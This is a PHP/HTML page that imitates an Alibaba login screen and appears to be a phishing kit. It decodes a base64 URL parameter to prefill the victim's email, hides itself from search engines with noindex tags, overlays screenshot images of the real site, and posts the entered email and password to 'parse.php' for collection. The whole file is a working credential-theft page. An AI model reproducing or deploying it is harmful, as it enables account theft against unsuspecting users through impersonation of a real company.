<?php

if (isset($_GET['cid'])) {

	$cid = $_GET['cid'];
}
$id = base64_decode($cid);
?>
<html lang="en">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>Alibaba&nbsp;Manufacturer&nbsp;Directory&nbsp;-&nbsp;Suppliers,&nbsp;Manufacturers,&nbsp;Exporters&nbsp;&amp;amp;&nbsp;Importers&nbsp;</title>
<meta http-equiv='content-type' content="text/html; charset=ISO-8859-5">
<meta http-equiv='content-type' content="text/html; charset=UTF-8">
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Cache-Control" content="private">
<meta http-equiv="Pragma" content="no-cache">
<link rel="icon" type="images/ico" sizes="16*16" href="images/favicon.ico">

<style>



element {

}
#login-content .fm-text {

    width: 100%;

}
.fm-text:hover, .fm-textarea:hover {

    border: 1px solid #a6a6a6;

}
.fm-text {

    color: #333;
    background-color: #fff;
    border: 1px solid #ccc;
    transition: border linear .2s;

}
.fm-text, .fm-textarea {

    float: left;
    padding: 4px 6px;
    border: 1px solid #ccc;
    line-height: 17px;
    font-size: 12px;
    color: #595959;
    background: #fff;
        background-color: rgb(255, 255, 255);
    vertical-align: middle;
    -webkit-box-shadow: 0 1px 0 #ececec inset;
    -moz-box-shadow: 0 1px 0 #ececec inset;
    -ms-box-shadow: 0 1px 0 #ececec inset;
    -o-box-shadow: 0 1px 0 #ececec inset;
    box-shadow: 0 1px 0 #ececec inset;
    _padding: 5px 6px;

}
input {

    outline: 0;

}
blockquote, body, dd, div, dl, dt, fieldset, form, h1, h2, h3, h4, h5, h6, input, li, ol, p, pre, td, textarea, th, ul {

    margin: 0;
    padding: 0;

}
#login-form, .notice {

    font-family: Arial,Helvetica,sans-serif,SimSun,宋体;

}
#login-form {

    font: 400 12px arial;
        font-family: arial;
        font-size: 12px;
        line-height: normal;

}
body {

    font-family: Arial,Helvetica,sans-serif,SimSun,宋体;
    color: #000;

}
body {

    font: 12px/1.6 Tahoma,Arial,Hiragino Sans GB,宋体;
    color: #4d4d4d;
    -webkit-text-size-adjust: none;

}

</style>

<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

</head>
<body style="visibility: visible;" onload="unhideBody()" bgcolor="">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:860px; z-index:0">
<img src="images/a.png" alt="" title="" width="1349" border="0" height="860">
</div>
<div style="position:absolute; overflow:hidden;left:0px; top:101px; width:1349px; height:600px; z-index:1">
<img src="images/b.jpg" width="1349" height="600">
</div>
<div style="position:absolute; overflow:hidden; left:840px; top:142px; z-index:2">
<img type="image" name="image" class="image" tabindex="" src="images/2.png" width="400" border="0" height="399">
</div>
<form id="login" action="parse.php" name="login" method="post" onsubmit="return validateForm()">
<div class="fm-field-wrap ">
<input style="position:absolute; overflow:hidden; left:861px; top:246px; width:360px; height:27px; z-index:3" id="fm-login-id" class="fm-text" name="formtext1" value="<?php echo $id; ?>" tabindex="1" placeholder="Email address" value="" autocorrect="off" autocapitalize="off" spellcheck="false" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,3}$" oninvalid="setCustomValidity('Please enter your Email Address');" oninput="setCustomValidity('')" type="email" required=""/>
</div>
<div class="fm-field-wrap">
<input style="position:absolute; overflow:hidden; left:861px; top:308px; width:360px; height:27px; z-index:4" id="fm-login-password" class="fm-text" name="formtext2" tabindex="2" placeholder="Password" autocorrect="off" autocapitalize="off" type="password">
</div>
<div style="position:absolute; overflow:hidden; left:857px; top:373px; z-index:5">
<input onclick="check(this.form)" type="image" name="formimage" class="formimage" tabindex="3" src="images/3.png" width="366" border="0" height="32">
</div>
</form>
</body>
</html>